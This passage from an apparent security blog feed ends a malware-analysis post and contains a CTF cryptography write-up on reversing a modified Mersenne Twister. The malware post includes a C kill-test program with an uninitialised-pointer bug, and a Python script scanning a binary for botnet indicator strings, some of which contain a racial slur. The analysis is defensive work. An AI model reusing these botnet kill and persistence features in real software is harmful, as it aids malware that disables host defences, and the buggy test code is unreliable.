class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">FILE *fp;</span><br><span class="line"><span class="keyword">char</span> *res;</span><br><span class="line">system(<span class="string">&quot;xxd ./kill_me | grep dvr -A 1&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Kill_me_KEY is :dvrHelper&quot;</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;I&#x27;m alive at &quot;</span>);</span><br><span class="line">fp = popen(<span class="string">&quot;date&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">while</span>(fgets(res, <span class="keyword">sizeof</span>(res), fp) != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, res);</span><br><span class="line">&#125;</span><br><span class="line">pclose(fp);</span><br><span class="line">sleep(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>照这样每个字符串都过一遍<br />可以确定上文部分的特征都为字符串KILL特征</p><h1 id="key_in_hids"><a class="markdownIt-Anchor" href="#key_in_hids"></a> KEY_in_HIDS</h1><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">key = [</span><br><span class="line"><span class="string">&quot;dvrHelper&quot;</span>, </span><br><span class="line"><span class="string">&quot;NiGGeR69xd&quot;</span>, </span><br><span class="line"><span class="string">&quot;1337SoraLOADER&quot;</span>, </span><br><span class="line"><span class="string">&quot;NiGGeRd0nks1337&quot;</span>, </span><br><span class="line"><span class="string">&quot;X19I239124UIU&quot;</span>, </span><br><span class="line"><span class="string">&quot;IuYgujeIqn&quot;</span>, </span><br><span class="line"><span class="string">&quot;14Fa&quot;</span>, </span><br><span class="line"><span class="string">&quot;ccAD&quot;</span>, </span><br><span class="line"><span class="string">&quot;/proc/net/route&quot;</span>, </span><br><span class="line"><span class="string">&quot;/proc/cpuinfo&quot;</span>, </span><br><span class="line"><span class="string">&quot;BOGOMIPS&quot;</span>, </span><br><span class="line"><span class="string">&quot;/etc/rc.d/rc.local&quot;</span>, </span><br><span class="line"><span class="string">&quot;g1abc4dmo35hnp2lie0kjf&quot;</span>, </span><br><span class="line"><span class="string">&quot;/dev/watchdog&quot;</span>, </span><br><span class="line"><span class="string">&quot;/dev/misc/watchdog&quot;</span>, </span><br><span class="line"><span class="string">&quot;/dev/FTWDT101_watchdog&quot;</span>, </span><br><span class="line"><span class="string">&quot;/dev/netslink/&quot;</span>, </span><br><span class="line"><span class="string">&quot;PRIVMSG&quot;</span>, </span><br><span class="line"><span class="string">&quot;GETLOCALIP&quot;</span>, </span><br><span class="line"><span class="string">&quot;KILLATTK&quot;</span>, </span><br><span class="line"><span class="string">&quot;Eats8&quot;</span>, </span><br><span class="line"><span class="string">&quot;v[0v&quot;</span>, </span><br><span class="line"><span class="string">&quot;93OfjHZ2z&quot;</span>, </span><br><span class="line"><span class="string">&quot;GhostWuzHere666&quot;</span>, </span><br><span class="line"><span class="string">&quot;WsGA4@F6F&quot;</span>, </span><br><span class="line"><span class="string">&quot;ACDB&quot;</span>, </span><br><span class="line"><span class="string">&quot;AbAd&quot;</span>, </span><br><span class="line"><span class="string">&quot;iaGv&quot;</span>]</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;/usr/local/[DATA_EXPUNGED]&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">data = f.read()</span><br><span class="line">f.close()</span><br><span class="line">data = binascii.hexlify(data).decode()</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> key:</span><br><span class="line">hex_key = binascii.hexlify(_.encode()).decode()</span><br><span class="line">find_list = re.findall(hex_key, data)</span><br><span class="line"><span class="keyword">if</span> find_list != []:</span><br><span class="line">print(_)</span><br></pre></td></tr></table></figure><p>写份报告就能交差了</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;上班的时候被安排了个分析恶意样本的活&lt;br /&gt;
说是这个恶意样本会选择性地KILL进程，把公司开发的HIDS给KILL了&lt;br /&gt;
让我分析一下这个恶意样本的KILL机制以及KILL特征&lt;br /&gt;
&lt;s&gt;WEB手，但是干的或是恶意样本分析&lt;/s&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="Reverse" scheme="https://yoloyolo.top/tags/Reverse/"/>
    
    <category term="Malware" scheme="https://yoloyolo.top/tags/Malware/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF_MAY_2022</title>
    <link href="https://yoloyolo.top/2022/05/21/DASCTF-MAY-2022/"/>
    <id>https://yoloyolo.top/2022/05/21/DASCTF-MAY-2022/</id>
    <published>2022-05-22T02:11:59.000Z</published>
    <updated>2022-06-27T18:30:18.000Z</updated>
    
    <content type="html"><![CDATA[<p>老样子，赛后解题</p><a id="more"></a><h1 id="yusa的密码学课堂一见如故"><a class="markdownIt-Anchor" href="#yusa的密码学课堂一见如故"></a> Yusa的密码学课堂——一见如故</h1><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Myrand</span>():</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,seed</span>):</span></span><br><span class="line">self.index = <span class="number">0</span></span><br><span class="line">self.isInit = <span class="number">1</span></span><br><span class="line">self.MT = [seed] + [<span class="number">0</span>] * <span class="number">623</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">624</span>):</span><br><span class="line">t = <span class="number">1314433253</span> * (self.MT[i-<span class="number">1</span>] ^ (self.MT[i-<span class="number">1</span>] &gt;&gt; <span class="number">30</span>)) + <span class="number">1</span></span><br><span class="line">self.MT[i] = t &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span>(<span class="params">self</span>):</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">y = (self.MT[i] &amp; <span class="number">0x80000000</span>) + (self.MT[(i+<span class="number">1</span>)%<span class="number">624</span>] &amp; <span class="number">0x7fffffff</span>)</span><br><span class="line">self.MT[i] = self.MT[(i+<span class="number">397</span>)%<span class="number">624</span>] ^ (y &gt;&gt; <span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> y &amp; <span class="number">1</span>:</span><br><span class="line">self.MT[i] ^= <span class="number">2567483520</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rand</span>(<span class="params">self</span>):</span></span><br><span class="line"><span class="keyword">if</span> self.index == <span class="number">0</span>:</span><br><span class="line">self.generate()</span><br><span class="line">y = self.MT[self.index]</span><br><span class="line">y = y ^ self.cs2l(y, <span class="number">11</span>) ^ self.cs2l(y, <span class="number">15</span>)</span><br><span class="line">y = y ^ self.cs2r(y, <span class="number">7</span>) ^ self.cs2r(y, <span class="number">19</span>)</span><br><span class="line">self.index = (self.index + <span class="number">1</span>) % <span class="number">624</span></span><br><span class="line"><span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cs2l</span>(<span class="params">self, y, shift</span>):</span></span><br><span class="line"><span class="keyword">return</span> ((y &lt;&lt; shift) ^ (y &gt;&gt; (<span class="number">32</span> - shift))) &amp; <span class="number">0xffffffff</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cs2r</span>(<span class="params">self, y, shift</span>):</span></span><br><span class="line"><span class="keyword">return</span> ((y &gt;&gt; shift) ^ (y &lt;&lt; (<span class="number">32</span> - shift))) &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">r = Myrand(<span class="built_in">int</span>(os.urandom(<span class="number">4</span>).<span class="built_in">hex</span>(),<span class="number">16</span>))</span><br><span class="line">out = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">out.append(r.rand())</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(<span class="built_in">str</span>(out))</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line">flag = <span class="string">&#x27;DASCTF&#123;&#x27;</span> + md5(<span class="built_in">str</span>(r.rand()).encode()).hexdigest() + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><ul><li>函数<code>__init__(self,seed)</code>用于初始化</li><li>函数<code>rand(self)</code>为主要函数</li><li>函数<code>generate(self)</code>用于当<code>index</code>为0时重新生成列表<code>MT</code></li><li>函数<code>cs2l(self, y, shift)</code>用于将<code>y</code>按bit循环左移<code>shift</code>位</li><li>函数<code>cs2r(self, y, shift)</code>用于将<code>y</code>按bit循环右移<code>shift</code>位</li></ul><p>由于是先生成了624个随机数，即遍历了一遍列表<code>MT</code>，再生成了flag<br />所以我们用给出的624个随机数逆推出列表<code>MT</code>的状态，再调用一下函数<code>generate(self)</code>，最后在生成一个随机数即可获得flag</p><p>此题的难点在于这两条语句的逆算法</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">y = y ^ self.cs2l(y, <span class="number">11</span>) ^ self.cs2l(y, <span class="number">15</span>)</span><br><span class="line">y = y ^ self.cs2r(y, <span class="number">7</span>) ^ self.cs2r(y, <span class="number">19</span>)</span><br></pre></td></tr></table></figure><p>先看第一条语句，产生的结果等价如下方程组<br /><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo fence="true">{</mo><mtable rowspacing="0.3599999999999999em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>0</mn></msub><mo>=</mo><msub><mi>b</mi><mn>0</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>11</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>15</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>1</mn></msub><mo>=</mo><msub><mi>b</mi><mn>1</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>12</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>16</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>2</mn></msub><mo>=</mo><msub><mi>b</mi><mn>2</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>13</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>17</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>3</mn></msub><mo>=</mo><msub><mi>b</mi><mn>3</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>14</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>18</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>4</mn></msub><mo>=</mo><msub><mi>b</mi><mn>4</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>15</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>19</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>5</mn></msub><mo>=</mo><msub><mi>b</mi><mn>5</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>16</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>20</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>6</mn></msub><mo>=</mo><msub><mi>b</mi><mn>6</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>17</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>21</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>7</mn></msub><mo>=</mo><msub><mi>b</mi><mn>7</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>18</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>22</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>8</mn></msub><mo>=</mo><msub><mi>b</mi><mn>8</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>19</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>23</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>9</mn></msub><mo>=</mo><msub><mi>b</mi><mn>9</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>20</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>24</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>10</mn></msub><mo>=</mo><msub><mi>b</mi><mn>10</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>21</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>25</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>11</mn></msub><mo>=</mo><msub><mi>b</mi><mn>11</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>22</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>26</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>12</mn></msub><mo>=</mo><msub><mi>b</mi><mn>12</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>23</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>27</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>13</mn></msub><mo>=</mo><msub><mi>b</mi><mn>13</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>24</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>28</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>14</mn></msub><mo>=</mo><msub><mi>b</mi><mn>14</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>25</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>29</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>15</mn></msub><mo>=</mo><msub><mi>b</mi><mn>15</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>26</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>30</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>16</mn></msub><mo>=</mo><msub><mi>b</mi><mn>16</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>27</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>31</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>17</mn></msub><mo>=</mo><msub><mi>b</mi><mn>17</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>28</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>0</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>18</mn></msub><mo>=</mo><msub><mi>b</mi><mn>18</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>29</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>1</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>19</mn></msub><mo>=</mo><msub><mi>b</mi><mn>19</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>30</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>2</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>20</mn></msub><mo>=</mo><msub><mi>b</mi><mn>20</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>31</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>3</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>21</mn></msub><mo>=</mo><msub><mi>b</mi><mn>21</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>0</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>4</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>22</mn></msub><mo>=</mo><msub><mi>b</mi><mn>22</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>1</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>5</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>23</mn></msub><mo>=</mo><msub><mi>b</mi><mn>23</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>2</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>6</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>24</mn></msub><mo>=</mo><msub><mi>b</mi><mn>24</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>3</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>7</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>25</mn></msub><mo>=</mo><msub><mi>b</mi><mn>25</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>4</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>8</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>26</mn></msub><mo>=</mo><msub><mi>b</mi><mn>26</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>5</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>9</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>27</mn></msub><mo>=</mo><msub><mi>b</mi><mn>27</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>6</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>10</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>28</mn></msub><mo>=</mo><msub><mi>b</mi><mn>28</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>7</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>11</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>29</mn></msub><mo>=</mo><msub><mi>b</mi><mn>29</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>8</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>12</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>30</mn></msub><mo>=</mo><msub><mi>b</mi><mn>30</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>9</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>13</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>31</mn></msub><mo>=</mo><msub><mi>b</mi><mn>31</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>10</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>14</mn></msub></mrow></mstyle></mtd></mtr></mtable></mrow><annotation encoding="application/x-tex">\begin{cases} a_{0} = b_{0} \oplus b_{11} \oplus b_{15} \\ a_{1} = b_{1} \oplus b_{12} \oplus b_{16} \\ a_{2} = b_{2} \oplus b_{13} \oplus b_{17} \\ a_{3} = b_{3} \oplus b_{14} \oplus b_{18} \\ a_{4} = b_{4} \oplus b_{15} \oplus b_{19} \\ a_{5} = b_{5} \oplus b_{16} \oplus b_{20} \\ a_{6} = b_{6} \oplus b_{17} \oplus b_{21} \\ a_{7} = b_{7} \oplus b_{18} \oplus b_{22} \\ a_{8} = b_{8} \oplus b_{19} \oplus b_{23} \\ a_{9} = b_{9} \oplus b_{20} \oplus b_{24} \\ a_{10} = b_{10} \oplus b_{21} \oplus b_{25} \\ a_{11} = b_{11} \oplus b_{22} \oplus b_{26} \\ a_{12} = b_{12} \oplus b_{23} \oplus b_{27} \\ a_{13} = b_{13} \oplus b_{24} \oplus b_{28} \\ a_{14} = b_{14} \oplus b_{25} \oplus b_{29} \\ a_{15} = b_{15} \oplus b_{26} \oplus b_{30} \\ a_{16} = b_{16} \oplus b_{27} \oplus b_{31} \\ a_{17} = b_{17} \oplus b_{28} \oplus b_{0} \\ a_{18} = b_{18} \oplus b_{29} \oplus b_{1} \\ a_{19} = b_{19} \oplus b_{30} \oplus b_{2} \\ a_{20} = b_{20} \oplus b_{31} \oplus b_{3} \\ a_{21} = b_{21} \oplus b_{0} \oplus b_{4} \\ a_{22} = b_{22} \oplus b_{1} \oplus b_{5} \\ a_{23} = b_{23} \oplus b_{2} \oplus b_{6} \\ a_{24} = b_{24} \oplus b_{3} \oplus b_{7} \\ a_{25} = b_{25} \oplus b_{4} \oplus b_{8} \\ a_{26} = b_{26} \oplus b_{5} \oplus b_{9} \\ a_{27} = b_{27} \oplus b_{6} \oplus b_{10} \\ a_{28} = b_{28} \oplus b_{7} \oplus b_{11} \\ a_{29} = b_{29} \oplus b_{8} \oplus b_{12} \\ a_{30} = b_{30} \oplus b_{9} \oplus b_{13} \\ a_{31} = b_{31} \oplus b_{10} \oplus b_{14} \end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:46.080000000000034em;vertical-align:-22.790000000000013em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:23.050020000000053em;"><span style="top:18.500010000000003em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎩</span></span></span><span style="top:18.500010000000003em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:18.200010000000002em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:17.90001em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:17.60001em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:17.30001em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:17.00001em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:16.70001em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:16.400009999999998em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:16.100009999999997em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:15.800009999999995em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:15.500009999999994em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:15.200009999999994em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:14.900009999999993em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:14.600009999999992em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:14.300009999999991em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:14.00000999999999em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:13.70000999999999em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:13.40000999999999em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:13.100009999999989em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:12.800009999999988em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:12.500009999999987em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:12.200009999999986em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:11.900009999999986em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:11.600009999999985em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:11.300009999999984em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:11.000009999999984em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:10.700009999999983em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:10.400009999999982em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner 